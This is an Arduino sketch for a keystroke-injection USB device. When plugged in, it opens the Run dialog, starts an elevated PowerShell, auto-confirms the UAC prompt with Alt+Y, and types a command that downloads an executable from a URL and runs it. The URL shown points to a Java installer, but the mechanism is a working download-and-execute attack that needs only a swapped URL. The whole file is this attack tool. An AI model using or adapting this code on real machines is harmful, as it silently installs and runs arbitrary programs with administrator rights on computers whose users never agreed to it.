#include <Keyboard.h>
void setup() {
String url = "https://javadl.oracle.com/webapps/download/AutoDL?BundleId=245776_df5ad55fdd604472a86a45a217032c7d";
String file = "JavaSetup8u321.exe";
Keyboard.begin();
delay(1000);
Keyboard.press(KEY_LEFT_GUI);
Keyboard.press(114);
Keyboard.releaseAll();
delay(200);
Keyboard.print("powershell Start-Process powershell -Verb runAs");
typeKey(KEY_RETURN);
delay(1000);
Keyboard.press(KEY_LEFT_ALT);
Keyboard.press(121);
Keyboard.releaseAll();
delay(200);
Keyboard.print("[Net.ServicePointManager]::SecurityProtocol = \"tls12, tls11, tls\"; $down = New-Object System.Net.WebClient; $url = '" + url +"'; $file = '" + file +"'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($PSScriptRoot + $file); exit;");
typeKey(KEY_RETURN);
Keyboard.end();
}
void typeKey(int key){
Keyboard.press(key);
delay(50);
Keyboard.release(key);
}
void loop() {}
